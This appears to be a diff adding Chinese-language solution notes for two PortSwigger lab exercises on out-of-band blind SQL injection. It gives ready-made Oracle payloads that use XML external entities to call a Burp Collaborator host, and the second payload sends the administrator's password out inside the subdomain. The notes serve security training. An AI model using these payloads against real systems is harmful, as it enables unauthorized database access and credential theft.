@@ -1,0 +1,17 @@
+### 带外盲注 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+@@@ 还需进行URL编码
+<@burp_urlencode>
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT 'testsqli' FROM dual)||'.4bgll5v1t1ehgrt3jmy8249jmas1gs6gv.oastify.com"> %remote;]>'),'/l') FROM dual -- 
+</@burp_urlencode>
+@@@
+
+
+### 带外数据外泄盲注 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+将前一个lab的查询语句中写入数据查询
+<@burp_urlencode>
+' UNION SELECT EXTRACTVALUE(
+    xmltype(
+        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.2nqjx37z5zqfsp51vka6e2lhy84zsqje8.oastify.com"> %remote;]>'),'/l') FROM dual -- 
+</@burp_urlencode>
